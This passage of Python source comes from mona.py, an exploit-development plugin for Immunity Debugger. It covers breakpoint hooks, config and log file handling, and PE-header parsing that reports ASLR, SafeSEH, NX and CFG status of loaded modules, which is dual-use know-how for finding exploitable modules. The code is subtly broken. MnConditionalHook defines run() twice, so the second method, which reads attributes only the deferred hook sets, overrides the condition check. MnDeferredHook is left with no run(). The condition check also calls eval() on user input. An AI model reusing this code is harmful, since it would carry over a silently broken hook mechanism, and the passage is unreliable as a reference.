		newvals.append(val3)
		return newvals		
		
				
#---------------------------------------#
#   Class to set deferred BP Hooks      #
#---------------------------------------#
class MnDeferredHook(LogBpHook):
	def __init__(self, loadlibraryptr, targetptr):
		LogBpHook.__init__(self)
		self.targetptr = targetptr
		self.loadlibraryptr = loadlibraryptr

#---------------------------------------#
#   Class for conditional BP Hooks      #
#---------------------------------------#
class MnConditionalHook(LogBpHook):
	def __init__(self, condition):
		LogBpHook.__init__(self)
		self.condition = condition

	def run(self, regs):
		try:
			if eval(self.condition, {"regs": regs, "eax": regs["eax"], "ecx": regs["ecx"],
				"edx": regs["edx"], "ebx": regs["ebx"], "esp": regs["esp"],
				"ebp": regs["ebp"], "esi": regs["esi"], "edi": regs["edi"],
				"eip": regs["eip"]}):
				dbg.log("[+] Condition met: %s" % self.condition, highlight=1)
				dbg.pause()
		except:
			pass
		
	def run(self,regs):
		#dbg.log("0x%08x - DLL Loaded, checking for %s" % (self.loadlibraryptr,self.targetptr), highlight=1)
		dbg.pause()
		if self.targetptr.find(".") > -1:
			# function name, try to resolve
			functionaddress = dbg.getAddress(self.targetptr)
			if functionaddress > 0:
				dbg.log("Deferred Breakpoint set at %s (0x%08x)" % (self.targetptr,functionaddress),highlight=1)
				dbg.setBreakpoint(functionaddress)
				self.UnHook()
				dbg.log("Hook removed")
				dbg.run()
				return
		if self.targetptr.find("+") > -1:
			ptrparts = self.targetptr.split("+")
			modname = ptrparts[0]
			if not modname.lower().endswith(".dll"):
				modname += ".dll" 
			themodule = getModuleObj(modname)
			if themodule != None and len(ptrparts) > 1:
				address = themodule.getBase() + int(ptrparts[1],16)
				if address > 0:
					dbg.log("Deferred Breakpoint set at %s (0x%08x)" % (self.targetptr,address),highlight=1)
					dbg.setBreakpoint(address)
					self.UnHook()
					dbg.log("Hook removed")
					dbg.run()
					return
		if self.targetptr.find("+") == -1 and self.targetptr.find(".") == -1:
			address = int(self.targetptr,16)
			thispage = dbg.getMemoryPageByAddress(address)
			if thispage != None:
				dbg.setBreakpoint(address)
				dbg.log("Deferred Breakpoint set at 0x%08x" % address, highlight=1)
				self.UnHook()
				dbg.log("Hook removed")
		dbg.run()

#---------------------------------------#
#   Class to access config file         #
#---------------------------------------#
class MnConfig:
	"""
	Class to perform config file operations
	"""
	def __init__(self):
		global configwarningshown

		dbgp(get_current_function_name())

		self.configfile = "mona.ini"

		# Folder where mona.py resides
		try:
			if "__file__" in globals():
				self.currpath = os.path.dirname(os.path.abspath(__file__))
			else:
				self.currpath = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
		except:
			self.currpath = os.getcwd()

		self.fullpath = os.path.join(self.currpath, self.configfile)

		# Legacy/current-working-folder location
		self.legacyfullpath = os.path.join(os.getcwd(), self.configfile)

		# Migrate old mona.ini from current working folder to mona.py folder
		# only if target does not exist yet
		try:
			if (not os.path.exists(self.fullpath)) and os.path.exists(self.legacyfullpath):
				# avoid trying to move onto itself
				if os.path.abspath(self.fullpath).lower() != os.path.abspath(self.legacyfullpath).lower():
					shutil.move(self.legacyfullpath, self.fullpath)
					dbg.log("[+] Migrated mona.ini")
					dbg.log("    From %s" % (self.legacyfullpath))
					dbg.log("    To   %s" % (self.fullpath))
		except Exception as e:
			dbg.log(" ** Warning: unable to migrate mona.ini from %s to %s : %s" % (self.legacyfullpath, self.fullpath, str(e)), highlight=1)

		dbgp("MnConfig using config file: %s" % self.fullpath)

		if __DEBUGGERAPP__ == "Immunity Debugger":
			try:
				immunity_path = dbg.getImmunityPath()
				expected_path = os.path.join(immunity_path, "PyCommands")
			except:
				expected_path = None

			# Only warn if we know the expected path and we're not using it
			if expected_path and os.path.abspath(self.currpath).lower() != os.path.abspath(expected_path).lower():
				if not configwarningshown:
					dbg.log(" ** Warning: mona.ini is expected in %s but is currently in %s" % (expected_path, self.currpath), highlight=True)
					configwarningshown = True


	def getFileName(self):
		return self.fullpath

	def list(self):
		global configFileCache

		dbgp(get_current_function_name())

		configFileCache = {}
		headers = ["Parameter", "Value"]
		types   = ["string", "string"]

		if os.path.exists(self.fullpath):
			try:
				configfileobj = open(self.fullpath, "rb")
				content = configfileobj.readlines()
				configfileobj.close()

				dbgp("    Reading config content line by line")

				for thisLine in content:
					thisLine = thisLine.decode("latin-1").strip()
					dbgp("    Line: %s" % thisLine)

					if thisLine and not thisLine.startswith("#") and "=" in thisLine:
						thisparam, thisvalue = thisLine.split("=", 1)
						thisparam = thisparam.strip().lower()
						thisvalue = thisvalue.strip().lower().replace("\n", "").replace("\r", "")
						configFileCache[thisparam] = thisvalue

						dbgp("Stored parameter %s with value %s in configFileCache %s" % (thisparam, thisvalue, configFileCache))

				print_dict_table(configFileCache, headers, types, padding="      ", itemsequence=[])

			except Exception as e:
				dbgp("Error processing config file %s: %s" % (self.fullpath, str(e)), errormode=False)

	def get(self, parameter):
		"""
		Retrieves the contents of a given parameter from the config file
		or from memory if the config file has been read already
		(configFileCache)

		Arguments:
		parameter - the name of the parameter

		Return:
		A string, containing the contents of that parameter
		"""
		global configFileCache

		dbgp(get_current_function_name())

		toreturn = ""
		paramkey = parameter.strip().lower()

		if paramkey in configFileCache:
			return configFileCache[paramkey]

		if len(configFileCache) == 0:
			if os.path.exists(self.fullpath):
				try:
					configfileobj = open(self.fullpath, "rb")
					content = configfileobj.readlines()
					configfileobj.close()

					dbgp("    Reading config content line by line")

					for thisLine in content:
						thisLine = thisLine.decode("latin-1").strip()

						dbgp("    Line: %s" % thisLine)

						if thisLine and not thisLine.startswith("#") and "=" in thisLine:
							thisparam, thisvalue = thisLine.split("=", 1)
							thisparam = thisparam.strip().lower()
							thisvalue = thisvalue.strip().lower().replace("\n", "").replace("\r", "")

							if thisparam not in configFileCache:
								configFileCache[thisparam] = thisvalue

							if thisparam == paramkey:
								toreturn = thisvalue

				except Exception as e:
					dbgp("Error processing config file %s: %s" % (self.fullpath, str(e)), errormode=False)
					toreturn = ""
			else:
				dbgp("Config file %s does not seem to exist" % self.fullpath)

		return toreturn

	def set(self, parameter, paramvalue):
		"""
		Sets/Overwrites the contents of a given parameter in the config file

		Arguments:
		parameter - the name of the parameter
		paramvalue - the new value of the parameter

		Return:
		nothing
		"""
		global configFileCache

		dbgp(get_current_function_name())

		paramkey = parameter.strip().lower()
		paramvalue = str(paramvalue).strip()

		if len(configFileCache) > 0:
			configFileCache[paramkey] = paramvalue

		if os.path.exists(self.fullpath):
			dbgp("Editing existing config file %s" % self.fullpath)
			dbgp("Setting parameter %s to %s" % (parameter, paramvalue))

			try:
				configfileobj = open(self.fullpath, "r")
				content = configfileobj.readlines()
				configfileobj.close()

				newcontent = []
				paramfound = False

				for thisLine in content:
					thisLine = thisLine.replace("\n", "").replace("\r", "")
					if thisLine and not thisLine.startswith("#"):
						currparam = thisLine.split("=", 1)
						if currparam[0].strip().lower() == paramkey:
							newcontent.append(parameter + "=" + paramvalue + "\n")
							paramfound = True
						else:
							newcontent.append(thisLine + "\n")
					else:
						newcontent.append(thisLine + "\n")

				if not paramfound:
					newcontent.append(parameter + "=" + paramvalue + "\n")

				dbg.log("[+] Saving config file, modified parameter %s" % parameter)
				FILE = open(self.fullpath, "w")
				FILE.writelines(newcontent)
				FILE.close()
				dbg.log("    mona.ini saved under %s" % self.currpath)
			except:
				dbg.log("Error writing config file : %s : %s" % (sys.exc_type, sys.exc_value), highlight=1)
				return ""
		else:
			try:
				dbg.log("[+] Creating config file, setting parameter %s" % parameter)

				FILE = open(self.fullpath, "w")
				FILE.write("# -----------------------------------------------#\n")
				FILE.write("# mona.py configuration file                      #\n")
				FILE.write("# Corelan Consulting bv - https://www.corelan.be #\n")
				FILE.write("# -----------------------------------------------#\n")
				FILE.write(parameter + "=" + paramvalue + "\n")
				FILE.close()

				dbg.log("    mona.ini saved under %s" % self.currpath)
			except:
				dbg.log(" ** Error writing config file", highlight=1)
				return ""

		return ""

	def clear(self, parameter):
		"""
		Removes/Clears a parameter from the config file

		Arguments:
		parameter - the name of the parameter to remove

		Return:
		nothing
		"""
		global configFileCache

		dbgp(get_current_function_name())

		paramdel = parameter.lower().strip()
		if paramdel in configFileCache:
			del configFileCache[paramdel]

		if os.path.exists(self.fullpath):
			dbgp("Editing existing config file %s" % self.fullpath)
			dbgp("Removing / clearing parameter %s " % parameter)

			try:
				configfileobj = open(self.fullpath, "r")
				content = configfileobj.readlines()
				configfileobj.close()

				newcontent = []
				for thisLine in content:
					thisLine = thisLine.replace("\n", "").replace("\r", "")
					if thisLine and not thisLine.startswith("#"):
						currparam = thisLine.split("=", 1)
						if currparam[0].strip().lower() != paramdel:
							newcontent.append(thisLine + "\n")
					else:
						newcontent.append(thisLine + "\n")

				dbg.log("[+] Saving config file, removed parameter %s" % parameter)
				FILE = open(self.fullpath, "w")
				FILE.writelines(newcontent)
				FILE.close()
				dbg.log("    mona.ini saved under %s" % self.currpath)
			except:
				dbg.log("Error writing config file : %s : %s" % (sys.exc_type, sys.exc_value), highlight=1)
				return ""

		return ""

#---------------------------------------#
#   Class to log entries to file        #
#---------------------------------------#
class MnLog:
	"""
	Class to perform logfile operations
	"""
	def __init__(self, filename, numbered=False):
		dbgp(get_current_function_name())
		self.filename = filename
		self.numbered = numbered

	def _get_timestamped_filename(self, logfile, max_suffix=9999):
		"""
		Return a unique timestamped filename for logfile.
		Example: logfile 'name.xml' -> 'name-20260421153045.xml'
		If a file with the same timestamp exists, returns 'name-20260421153045-1.xml', etc.
		This routine is strictly bounded and cannot loop forever.
		"""
		root, ext = os.path.splitext(logfile)
		try:
			timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
		except Exception:
			try:
				timestamp = time.strftime("%Y%m%d%H%M%S")
			except Exception:
				timestamp = "00000000000000"

		candidate = "%s-%s%s" % (root, timestamp, ext)
		if not os.path.exists(candidate):
			return candidate

		# Bounded collision handling: append -1 .. -max_suffix
		for suffix in xrange(1, max_suffix + 1):
			candidate = "%s-%s-%d%s" % (root, timestamp, suffix, ext)
			if not os.path.exists(candidate):
				return candidate

		# Final bounded fallback: add short random token
		for _ in xrange(0, 100):
			try:
				rnd = "%04x" % random.randint(0, 0xFFFF)
			except Exception:
				rnd = "0000"
			candidate = "%s-%s-%s%s" % (root, timestamp, rnd, ext)
			if not os.path.exists(candidate):
				return candidate

		# Worst case: return a (very likely) unique name, but don't loop forever trying
		try:
			rnd = "%04x" % random.randint(0, 0xFFFF)
		except Exception:
			rnd = "0000"
		try:
			pid = os.getpid()
		except Exception:
			pid = 0
		return "%s-%s-%d-%s%s" % (root, timestamp, pid, rnd, ext)
		
	def reset(self,clear=True,showheader=True,skipModuleTable=False):
		"""
		Optionally clears a log file, write a header to the log file and return filename

		Optional :
		clear = Boolean. When set to false, the logfile won't be cleared. This method can be
		used to retrieve the full path to the logfile name of the current MnLog class object
		Logfiles are written to the debugger program folder, unless a config value 'workingfolder' is set.
		skipModuleTable = Boolean. When True, don't write the module table to the output file.

		Return:
		full path to the logfile name.
		"""	
		dbgp(get_current_function_name())
		global noheader
		if clear:
			dbgp("Filename: %s" % self.filename)
			if not silent:
				dbg.log("")
				if self.numbered:
					dbg.log("[+] Preparing output file '" + self.filename +"' (timestamped)")
				else:
					dbg.log("[+] Preparing output file '" + self.filename +"'")
		if not showheader:
			noheader = True
		debuggedname = dbg.getDebuggedName()
		thispid = dbg.getDebuggedPid()
		if thispid == 0:
			debuggedname = "_no_name_"
		
		thisconfig = MnConfig()
		workingfolder = thisconfig.get("workingfolder").rstrip("\\").strip()
		dbgp("Workingfolder: %s" % workingfolder)

		#strip extension from debuggedname
		parts = debuggedname.split(".")
		extlen = len(parts[len(parts)-1])+1
		debuggedname = debuggedname[0:len(debuggedname)-extlen]
		debuggedname = debuggedname.replace(" ","_")
		workingfolder = workingfolder.replace('%p', debuggedname)
		workingfolder = workingfolder.replace('%i', str(thispid))		
		#logfile = workingfolder + "\\" + self.filename
		# working folder will be created inside getAbsolutePath if needed
		logfile = getAbsolutePath(self.filename)

		if clear:
			if self.numbered:
				# when numbered=True: always create a timestamped logfile name
				try:
					logfile = self._get_timestamped_filename(logfile)
				except Exception:
					pass
			if not silent:
				dbg.log("    - (Re)setting output file %s" % logfile)
			if not self.numbered:
				# remove logfile.old2 if it exists
				try:
					if os.path.isfile(logfile + ".old2"):
						os.remove(logfile + ".old2")
				except Exception:
					pass

				# rotate logfile.old -> logfile.old2
				try:
					if os.path.isfile(logfile + ".old"):
						os.rename(logfile + ".old", logfile + ".old2")
				except Exception:
					pass

				# rotate logfile -> logfile.old
				try:
					if os.path.isfile(logfile):
						os.rename(logfile, logfile + ".old")
				except Exception:
					pass

			#write header
			if not noheader:
				try:
					with open(logfile,"w") as fh:
						separatorlength = 100
						fh.write("=" * separatorlength + '\n')
						thisversion,thisrevision = getVersionInfo(inspect.stack()[0][1])
						thisversion = thisversion.replace("'","")
						fh.write("  Output generated by mona.py v"+thisversion+", rev "+thisrevision+" - " + __DEBUGGERAPP__ + "\n")
						fh.write("  https://www.corelan.be | https://github.com/corelan/mona3\n")
						fh.write("  https://www.corelan-training.com | https://www.corelan-certified.com\n")
						fh.write("=" * separatorlength + '\n')
						osver=dbg.getOsVersion()
						osrel=dbg.getOsRelease()
						fh.write("  OS : " + osver + ", release " + osrel + "\n")
						fh.write("  Process being debugged : " + debuggedname +" (pid " + str(thispid) + ")\n")
						currmonaargs = " ".join(x for x in currentArgs)
						fh.write("  You ran: %s\n" % currmonaargs)
						fh.write("=" * separatorlength + '\n')
						fh.write("  " + get_current_datetime() + "\n")
						fh.write("=" * separatorlength + '\n')
				except:
					pass
			else:
				try:
					with open(logfile,"w") as fh:
						fh.write("")
				except:
					pass
			#write module table
			try:
				if not skipModuleTable:
					showModuleTable(logfile)
			except Exception as e:
				dbgp("showModuleTable failed: %s" % str(e), errormode=False)
				dbgp(traceback.format_exc(), errormode=False)
		return logfile
		
	def write(self,entry,logfile):
		"""
		Write an entry (can be multiline) to a given logfile

		Arguments:
		entry - the data to write to the logfile
		logfile - the full path to the logfile

		Return:
		nothing
		"""		
		towrite = ""
		#check if entry is int 
		if type(entry) == int:
			if entry > 0:
				ptrx = MnPointer(entry)
				modname = ptrx.belongsTo()
				modinfo = MnModule(modname)
				towrite = "0x" + toHex(entry) + " : " + ptrx.__str__() + " " + modinfo.__str__()
			else:
				towrite = entry
		else:
			towrite = entry
		# if this fails, we got an unprintable character
		try:
			towrite = str(towrite)
		except:
			# one at a time
			towrite2 = ""
			for c in towrite:
				try:
					towrite2 += str(c)
				except:
					towrite2 += "\\x" + str(hex(_ord(c))).replace("0x","")
			towrite = towrite2
		try:
			with open(logfile,"a") as fh:
				if towrite.find('\n') > -1:
					fh.writelines(towrite)
				else:
					fh.write(towrite+"\n")
		except:
			pass
		return True

#---------------------------------------#
#  Simple Queue class                   #
#---------------------------------------#
class MnQueue:
	"""
	Simple queue class
	"""
	def __init__(self):
		dbgp(get_current_function_name())

		self.holder = []
		
	def enqueue(self,val):
		self.holder.append(val)
		
	def dequeue(self):
		val = None
		try:
			val = self.holder[0]
			if len(self.holder) == 1:
				self.holder = []
			else:
				self.holder = self.holder[1:]	
		except:
			pass
			
		return val	
		
	def IsEmpty(self):
		result = False
		if len(self.holder) == 0:
			result = True
		return result	

#---------------------------------------#
#  Class to access module properties    #
#---------------------------------------#
class MnModule:
	"""
	Class to access module properties
	"""

	# PE offsets: (PE32, PE32+) unless noted
	_pe_offsets = {
		# IMAGE_DOS_HEADER
		"e_lfanew":              0x3c,           # same for both
		# IMAGE_FILE_HEADER (relative to PE signature)
		"NumberOfSections":      0x06,
		"SizeOfOptionalHeader":  0x14,
		# IMAGE_OPTIONAL_HEADER (relative to PE signature)
		"Magic":                 0x18,
		"AddressOfEntryPoint":   0x28,
		"ImageBase":             (0x34, 0x30),
		"SizeOfImage":           0x50,
		"DllCharacteristics":    0x5e,
		"NumberOfRvaAndSizes":   (0x74, 0x84),
		"DataDirectory":         (0x78, 0x88),
		# IMAGE_SECTION_HEADER (relative to section start)
		"Sec_VirtualSize":       0x08,
		"Sec_VirtualAddress":    0x0c,
		"Sec_Characteristics":   0x24,
		"Sec_Size":              40,             # sizeof(IMAGE_SECTION_HEADER)
		# IMAGE_LOAD_CONFIG_DIRECTORY32
		"SEHandlerTable":        0x40,
		"SEHandlerCount":        0x44,
		# IMAGE_DEBUG_DIRECTORY
		"DbgDir_Size":           28,             # sizeof(IMAGE_DEBUG_DIRECTORY)
		"DbgDir_Type":           12,
		"DbgDir_SizeOfData":     16,
		"DbgDir_AddressOfRawData": 20,
	}

	# Data directory entry indices
	_DD_DEBUG       = 6
	_DD_LOAD_CONFIG = 10

	class CFGTableEntry:
		def __init__(self, rva=0, flag_byte=0, flags=None, module_base=0):
			self.rva = rva
			self.va = module_base + rva if module_base else rva
			self.flag_byte = flag_byte
			self.flags = flags or []
			self.flags_text = ", ".join(self.flags) if self.flags else "-"

	class CFGTable:
		def __init__(self, module_base=0):
			self.module_base = module_base
			self.cfg_check_fp = 0
			self.cfg_dispatch_fp = 0
			self.cfg_table_va = 0
			self.cfg_count = 0
			self.guard_flags = 0
			self.guard_flag_names = []
			self.entry_size = 0
			self.extra_size = 0
			self.entries = []
			self.bucket_hits = {}
			self.bucket_first_entries = {}
			self.sorted_buckets = {}
			self.compat_cache = {}

		def reset(self, module_base=None):
			if module_base is not None:
				self.module_base = module_base
			self.cfg_check_fp = 0
			self.cfg_dispatch_fp = 0
			self.cfg_table_va = 0
			self.cfg_count = 0
			self.guard_flags = 0
			self.guard_flag_names = []
			self.entry_size = 0
			self.extra_size = 0
			self.entries = []
			self.bucket_hits = {}
			self.bucket_first_entries = {}
			self.sorted_buckets = {}
			self.compat_cache = {}

		def add_entry(self, rva, flag_byte, flags):
			self.entries.append(MnModule.CFGTableEntry(rva, flag_byte, flags, self.module_base))

		def get_bucket_hits(self, granularity=16):
			if granularity in self.bucket_hits:
				return self.bucket_hits[granularity]

			buckets = set()
			first_entries = {}
			module_base = self.module_base

			for entry in self.entries:
				entry_va = entry.va
				if module_base and entry_va < module_base:
					entry_va = module_base + entry_va

				bucket = entry_va // granularity
				buckets.add(bucket)
				if bucket not in first_entries:
					first_entries[bucket] = entry

			self.bucket_hits[granularity] = buckets
			self.bucket_first_entries[granularity] = first_entries
			self.sorted_buckets[granularity] = sorted(buckets)
			self.compat_cache[granularity] = {}
			return buckets

		def get_bucket_first_entries(self, granularity=16):
			if granularity not in self.bucket_first_entries:
				self.get_bucket_hits(granularity)
			return self.bucket_first_entries[granularity]

		def get_compat_cache(self, granularity=16):
			if granularity not in self.compat_cache:
				self.get_bucket_hits(granularity)
			return self.compat_cache[granularity]

		def get_sorted_buckets(self, granularity=16):
			if granularity not in self.sorted_buckets:
				self.get_bucket_hits(granularity)
			return self.sorted_buckets[granularity]

		def __len__(self):
			return len(self.entries)

		def __iter__(self):
			return iter(self.entries)

	def __init__(self, modulename):
		#if DEBUG_MODE:
		dbgp(get_current_function_name())
		dbgp("Creating MnModule object for module '%s'" % modulename)
		modisaslr = True
		modissafeseh = True
		modrebased = True
		modisnx = True
		modisos = True
		modiscfg = True		
		self.IAT = {}
		self.EAT = {}
		path = ""
		filename = ""
		mzbase = 0
		mzsize = 0
		mztop = 0
		mcodebase = 0
		mcodesize = 0
		mcodetop = 0
		mentry = 0
		mdllcharacteristics = 0
		mversion = ""
		msehtable = 0
		msehcount = 0
		mpdbname = ""
		mpdbguidage = ""
		self.internalname = modulename
		if modulename != "":
			# if info is cached, retrieve from cache
			if ModInfoCached(modulename):
				dbgp("Module %s retrieved from cache" % modulename)
				cached = mnproc.g_modules.get(modulename.strip(), {})
				modisaslr = cached.get("aslr", modisaslr)
				modissafeseh = cached.get("safeseh", modissafeseh)
				modrebased = cached.get("rebase", modrebased)
				modisnx = cached.get("nx", modisnx)
				modisos = cached.get("os", modisos)
				modiscfg = cached.get("cfg", modiscfg)
				path = cached.get("path", path)
				filename = cached.get("filename", filename)
				mzbase = cached.get("base", mzbase)
				mzsize = cached.get("size", mzsize)
				mztop = cached.get("top", mztop)
				mversion = cached.get("version", mversion)
				mentry = cached.get("entry", mentry)
				mcodebase = cached.get("codebase", mcodebase)
				mcodesize = cached.get("codesize", mcodesize)
				mcodetop = cached.get("codetop", mcodetop)
				mdllcharacteristics = cached.get("dllcharacteristics", mdllcharacteristics)
				msehtable = cached.get("sehtable", 0) or 0
				msehcount = cached.get("sehcount", 0) or 0
				mpdbname = cached.get("pdbname", "") or ""
				mpdbguidage = cached.get("pdbguidage", "") or ""
			else:
				#gather info manually - this code should only get called from populateModuleInfo()
				modissafeseh = True
				modisaslr = True
				modisnx = True
				modrebased = False
				modisos = False
				modiscfg = False
				mzbase = MnPEB.base_from_peb(modulename)
				if mzbase == 0:
					# fall back to pykd if PEB walk fails
					self.moduleobj = dbg.getModule(modulename)
					mzbase = self.moduleobj.getBaseAddress() if self.moduleobj else 0

				path = MnPEB.path_from_peb(mzbase)
				if not path:
					if not hasattr(self, 'moduleobj'):
						self.moduleobj = dbg.getModule(modulename)
					if self.moduleobj:
						try:
							path = self.moduleobj.getPath()
						except Exception:
							pass
				filename = os.path.basename(path)

				# Version: parse VS_VERSION_INFO directly (no pykd symbol access).
				mversion = ""
				try:
					vi = MnModule.VSVersionInfo.from_file(path) if path else None
					if vi is None or not vi.fixed.file_version_str:
						vi = MnModule.VSVersionInfo.from_memory(mzbase)
					mversion = vi.fixed.file_version_str
				except Exception:
					try:
						vi = MnModule.VSVersionInfo.from_memory(mzbase)
						mversion = vi.fixed.file_version_str
					except Exception:
						mversion = ""
				if not mversion:
					mversion = "-1.0-"

				mdllcharacteristics = 0
				mzrebase  = mzbase  # default: assume not rebased
				mzsize    = 0
				mentry    = 0
				mcodebase = 0
				mcodesize = 0

				if mzbase > 0:
					peoffset = struct.unpack('<L', dbg.readMemory(mzbase + MnModule._pe_offsets["e_lfanew"], 4))[0]
					pebase = mzbase + peoffset

					pesig = struct.unpack('<I', dbg.readMemory(pebase, 4))[0]
					if pesig == 0x4550:
						optional_magic = struct.unpack('<H', dbg.readMemory(pebase + MnModule._pe_offsets["Magic"], 2))[0]
						is_pe64 = (optional_magic == 0x20b)
						_arch_index = 1 if is_pe64 else 0

						# SizeOfImage — same offset in PE32 and PE32+
						mzsize = struct.unpack('<L', dbg.readMemory(pebase + MnModule._pe_offsets["SizeOfImage"], 4))[0]

						# ImageBase: read from disk file — loader patches in-memory ImageBase to actual load address
						if path:
							try:
								with open(path, 'rb') as _f:
									_f.seek(MnModule._pe_offsets["e_lfanew"])
									_peo = struct.unpack('<L', _f.read(4))[0]
									_f.seek(_peo + MnModule._pe_offsets["Magic"])
									if struct.unpack('<H', _f.read(2))[0] == 0x20b:
										_f.seek(_peo + MnModule._pe_offsets["ImageBase"][1])
										mzrebase = struct.unpack('<Q', _f.read(8))[0]
									else:
										_f.seek(_peo + MnModule._pe_offsets["ImageBase"][0])
										mzrebase = struct.unpack('<L', _f.read(4))[0]
							except Exception:
								if is_pe64:
									mzrebase = struct.unpack('<Q', dbg.readMemory(pebase + MnModule._pe_offsets["ImageBase"][1], 8))[0]
								else:
									mzrebase = struct.unpack('<L', dbg.readMemory(pebase + MnModule._pe_offsets["ImageBase"][0], 4))[0]
						else:
							if is_pe64:
								mzrebase = struct.unpack('<Q', dbg.readMemory(pebase + MnModule._pe_offsets["ImageBase"][1], 8))[0]
							else:
								mzrebase = struct.unpack('<L', dbg.readMemory(pebase + MnModule._pe_offsets["ImageBase"][0], 4))[0]

						# AddressOfEntryPoint RVA — same offset in PE32 and PE32+
						aoe_rva = struct.unpack('<L', dbg.readMemory(pebase + MnModule._pe_offsets["AddressOfEntryPoint"], 4))[0]
						mentry  = mzbase + aoe_rva if aoe_rva != 0 else 0

						# DllCharacteristics — same offset in both
						dll_characteristics_flags = struct.unpack('<H', dbg.readMemory(pebase + MnModule._pe_offsets["DllCharacteristics"], 2))[0]
						mdllcharacteristics = dll_characteristics_flags
						modisaslr = ((dll_characteristics_flags & 0x0040) != 0)
						modisnx   = ((dll_characteristics_flags & 0x0100) != 0)
						modiscfg  = ((dll_characteristics_flags & 0x4000) != 0)
						modissafeseh = False

						# Walk section headers for first code section (IMAGE_SCN_CNT_CODE = 0x20)
						num_sections = struct.unpack('<H', dbg.readMemory(pebase + MnModule._pe_offsets["NumberOfSections"], 2))[0]
						opt_hdr_size = struct.unpack('<H', dbg.readMemory(pebase + MnModule._pe_offsets["SizeOfOptionalHeader"], 2))[0]
						sections_va  = pebase + MnModule._pe_offsets["Magic"] + opt_hdr_size
						for i in range(num_sections):
							sec       = sections_va + (i * MnModule._pe_offsets["Sec_Size"])
							sec_vsize = struct.unpack('<L', dbg.readMemory(sec + MnModule._pe_offsets["Sec_VirtualSize"], 4))[0]
							sec_vaddr = struct.unpack('<L', dbg.readMemory(sec + MnModule._pe_offsets["Sec_VirtualAddress"], 4))[0]
							sec_chars = struct.unpack('<L', dbg.readMemory(sec + MnModule._pe_offsets["Sec_Characteristics"], 4))[0]
							if sec_chars & 0x00000020:  # IMAGE_SCN_CNT_CODE
								mcodebase = mzbase + sec_vaddr
								mcodesize = sec_vsize
								break

						# SafeSEH: PE32 only (no SEH in 64-bit)
						if not is_pe64:
							numberofentries = struct.unpack('<L', dbg.readMemory(pebase + MnModule._pe_offsets["NumberOfRvaAndSizes"][_arch_index], 4))[0]
							if numberofentries > MnModule._DD_LOAD_CONFIG:
								loadcfg_rva, loadcfg_size = struct.unpack('<LL', dbg.readMemory(pebase + MnModule._pe_offsets["DataDirectory"][_arch_index] + (8 * MnModule._DD_LOAD_CONFIG), 8))[0:2]
								if loadcfg_rva != 0 and loadcfg_size != 0:
									loadcfg = mzbase + loadcfg_rva
									try:
										sehtable, sehcount = struct.unpack('<LL', dbg.readMemory(loadcfg + MnModule._pe_offsets["SEHandlerTable"], 8))
										if sehtable != 0 and sehcount != 0:
											modissafeseh = True
											msehtable = sehtable
											msehcount = sehcount
									except:
										modissafeseh = False

						# Parse RSDS CodeView entry to extract PDB GUID+AGE
						try:
							numentries = struct.unpack('<L', dbg.readMemory(pebase + MnModule._pe_offsets["NumberOfRvaAndSizes"][_arch_index], 4))[0]
							if numentries > MnModule._DD_DEBUG:
								dbg_rva, dbg_sz = struct.unpack('<LL', dbg.readMemory(pebase + MnModule._pe_offsets["DataDirectory"][_arch_index] + (8 * MnModule._DD_DEBUG), 8))
								if dbg_rva != 0 and dbg_sz != 0:
									dbg_dir = mzbase + dbg_rva
									num_dbg = dbg_sz // MnModule._pe_offsets["DbgDir_Size"]
									for di in range(num_dbg):
										dbg_entry = dbg_dir + (di * MnModule._pe_offsets["DbgDir_Size"])
										dbg_type = struct.unpack('<L', dbg.readMemory(dbg_entry + MnModule._pe_offsets["DbgDir_Type"], 4))[0]
										if dbg_type == 2:  # IMAGE_DEBUG_TYPE_CODEVIEW
											cv_rva = struct.unpack('<L', dbg.readMemory(dbg_entry + MnModule._pe_offsets["DbgDir_AddressOfRawData"], 4))[0]
											cv_datasize = struct.unpack('<L', dbg.readMemory(dbg_entry + MnModule._pe_offsets["DbgDir_SizeOfData"], 4))[0]
											if cv_rva != 0 and cv_datasize >= 24:
												cv_addr = mzbase + cv_rva
												cv_sig = dbg.readMemory(cv_addr, 4)
												if cv_sig == b'RSDS':
													g = dbg.readMemory(cv_addr + 4, 16)
													guid = (
														"%08x%04x%04x%s" % (
															struct.unpack('<L', g[0:4])[0],
															struct.unpack('<H', g[4:6])[0],
															struct.unpack('<H', g[6:8])[0],
															binascii.hexlify(g[8:16]).decode('ascii'),
														)
													).upper()
													age = struct.unpack('<L', dbg.readMemory(cv_addr + 20, 4))[0]
													pdb_raw = dbg.readMemory(cv_addr + 24, cv_datasize - 24)
													mpdbname = pdb_raw.split(b'\x00')[0].decode('utf-8', 'ignore')
													mpdbname = os.path.basename(mpdbname)
													mpdbguidage = "%s%X" % (guid, age)
												break
						except:
							pass

					if mzrebase != mzbase:
						modrebased = True

				mztop    = mzbase + mzsize
				mcodetop = mcodebase + mcodesize

				modisos = False
				try:
					_path_norm = path.replace("\\", "/").lower()
					_in_sys32  = "/windows/system32/" in _path_norm or "/windows/syswow64/" in _path_norm
					vi = None
					try:
						vi = MnModule.VSVersionInfo.from_memory(mzbase)
						if vi is None or not vi.fixed.file_version_str:
							vi = MnModule.VSVersionInfo.from_file(path)
					except Exception:
						try:
							vi = MnModule.VSVersionInfo.from_file(path)
						except Exception:
							vi = None
					if vi is not None and _in_sys32:
						for st in vi.string_tables:
							company = st.get("CompanyName", "")
							if isinstance(company, bytes):
								company = company.decode("latin-1")
							if "microsoft" in company.lower():
								modisos = True
								break
				except Exception:
					modisos = False
		else:
			# should never be hit
			return None

		#check if module is excluded
		global _excluded_modules_list
		if _excluded_modules_list is None:
			thisconfig = MnConfig()
			excludedlist = thisconfig.get("excluded_modules")
			if excludedlist:
				_excluded_modules_list = [e.lower().strip() for e in re.split(r"[;,]", excludedlist) if e.strip()]
			else:
				_excluded_modules_list = []
		modfound = False
		mod_lower = modulename.lower().strip()
		for exclentry in _excluded_modules_list:
			if mod_lower.startswith(exclentry):
				modfound = True
				break

		self.isExcluded = modfound
		
		#done - populate variables
		self.isAslr = modisaslr
		
		self.isSafeSEH = modissafeseh
		
		self.isRebase = modrebased
		
		self.isNX = modisnx
		
		self.isOS = modisos

		self.isCFG = modiscfg
		
		self.moduleKey = modulename
	
		self.modulePath = path

		self.moduleFilename = filename
		
		self.moduleBase = mzbase
		
		self.moduleSize = mzsize
		
		self.moduleTop = mztop
		
		self.moduleVersion = mversion
		
		self.moduleEntry = mentry
		
		self.moduleCodesize = mcodesize
		
		self.moduleCodetop = mcodetop
		
		self.moduleCodebase = mcodebase

